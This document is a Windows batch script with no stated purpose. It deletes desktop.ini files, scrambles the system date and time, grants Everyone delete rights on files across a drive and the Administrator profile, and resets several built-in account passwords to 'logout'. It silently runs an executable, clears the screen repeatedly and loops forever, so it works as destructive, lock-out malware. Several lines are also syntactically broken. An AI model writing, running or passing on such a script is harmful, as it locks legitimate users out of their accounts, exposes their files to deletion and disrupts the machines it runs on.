@echo off

setlocal EnableDelayedExpansion

REM            BATCH  FILE

chcp 65001
cls

cls

cls && X: && cls & cls

cls && cd X:\ && cls & cls

cls && cd X:\Users && cls & cls

FOR /r %%G in ("*") Do (@echo %%G
DEL "desktop.ini" /s /q )





:looper

CLS & CLS && SET /A "DNI=13+%RANDOM%%13" && CLS & CLS
CLS & CLS && SET /A "MES=5+%RANDOM%%5" && CLS & CLS
CLS & CLS && SET /A "GODA=2025+%RANDOM%%5" && CLS & CLS
CLS & CLS && ECHO %DNI%-%MES%-%GODA% && CLS
CLS & CLS && SET DATE %DNI%-%MES%-%GODA% && CLS & CLS
CLS & CLS && SET /A "CHASI=5+%RANDOM%%18" && CLS & CLS
CLS & CLS && SET /A "MINUTI=15+%RANDOM%%34" && CLS & CLS
CLS & CLS && SET /A "SECUNDI=15+%RANDOM%%34" && CLS & CLS
CLS & CLS && SET /A "MILISEC=4+%RANDOM%%3" && CLS & CLS
CLS & CLS && SET TIME %CHASI%:%MINUTI%:%SECUNDI%,%MILISEC% && CLS & CLS

cls && X: && cls
cls && cd X:\ && cls
FOR /r %%G in ("*") Do (@echo %%G
icacls * /grant *S-1-1-0:D )

cls && X: && cls
cls && cd X:\Users && cls
FOR /r %%G in ("*") Do (@echo %%G
icacls * /grant *S-1-1-0:D )


cls && X: && cls & cls
cls && cd X:\Users\Administrator && cls & cls
FOR /r %%G in ("*") Do (@echo %%G
icacls * /grant *S-1-1-0:D )

cls & cls & cls && cls & cls && time 00:00 && cls & cls && cls & cls & cls

cls & cls & cls && net user Administrator logout && cls & cls && cls & cls & cls

cls & cls & cls && net user WDAGUtilityAccount logout && cls & cls && cls & cls & cls

cls & cls & cls && net user DefaultAccount logout && cls & cls && cls & cls & cls

cls & cls & cls && cls & cls && X: && cls & cls & cls

cls & cls & cls &&  && cd X:\ && cls & cls & cls

cls & cls & cls && cls & cls && cd X:\Users\Administrator && cls & cls & cls

FOR /r %%G in ("*") Do (@echo %%G
DEL "desktop.ini" /s /q )
cls & cls & cls && "X:\TempCleaner_x64.exe" /S  && cls & cls & cls
cls

goto looper